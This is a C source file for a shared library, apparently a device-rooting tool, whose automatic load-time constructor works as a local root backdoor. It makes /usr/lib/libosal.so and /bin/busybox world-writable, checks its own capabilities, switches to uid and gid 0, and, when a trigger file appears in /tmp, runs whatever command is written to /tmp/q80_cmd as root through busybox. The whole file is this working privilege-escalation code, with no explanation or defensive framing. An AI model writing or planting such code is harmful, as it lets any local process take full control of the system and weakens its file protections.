typedef unsigned int u32;

extern int chmod(const char *path, unsigned int mode);
extern int chown(const char *path, unsigned int owner, unsigned int group);
extern int close(int fd);
extern int execve(const char *path, char *const argv[], char *const envp[]);
extern int open(const char *path, int flags, ...);
extern long read(int fd, void *buffer, unsigned long count);
extern int setgid(unsigned int gid);
extern int setuid(unsigned int uid);
extern long syscall(long number, ...);
extern int unlink(const char *path);
extern long write(int fd, const void *buffer, unsigned long count);

struct capability_header {
    u32 version;
    int pid;
};

struct capability_data {
    u32 effective;
    u32 permitted;
    u32 inheritable;
};

static unsigned long text_length(const char *text)
{
    unsigned long length = 0;
    while (text[length])
        ++length;
    return length;
}

__attribute__((constructor))
static void on_load(void)
{
    static const char library_path[] = "/usr/lib/libosal.so";
    static const char command_path[] = "/tmp/q80_cmd";
    static const char trigger_path[] = "/tmp/q80_go";
    static const char busybox_path[] = "/bin/busybox";
    static const char persistent_busybox_path[] =
        "/data/opt/q80_boot/busybox";
    static const char marker[] = "[Q80 ROOT CMD] exec failed\n";
    struct capability_header header = {0x20080522, 0};
    struct capability_data capabilities[2] = {{0, 0, 0}, {0, 0, 0}};
    char command[1024];
    char *const argv[] = {
        (char *)busybox_path,
        "sh",
        "-c",
        command,
        0,
    };
    long fd;
    long length;

    chown(library_path, 999, 999);
    chmod(library_path, 0777);
    chown(busybox_path, 999, 999);
    chmod(busybox_path, 0777);
    if (syscall(184, &header, capabilities) != 0)
        return;
    if ((capabilities[0].permitted & 0x80U) == 0)
        return;
    if (setgid(0) != 0 || setuid(0) != 0)
        return;

    fd = open(trigger_path, 0);
    if (fd < 0)
        return;
    close(fd);
    unlink(trigger_path);

    fd = open(command_path, 0);
    if (fd < 0)
        return;
    length = read(fd, command, sizeof(command) - 1);
    close(fd);
    if (length <= 0)
        return;

    command[length] = '\0';
    execve(persistent_busybox_path, argv, 0);
    execve(busybox_path, argv, 0);
    write(1, marker, sizeof(marker) - 1);
}
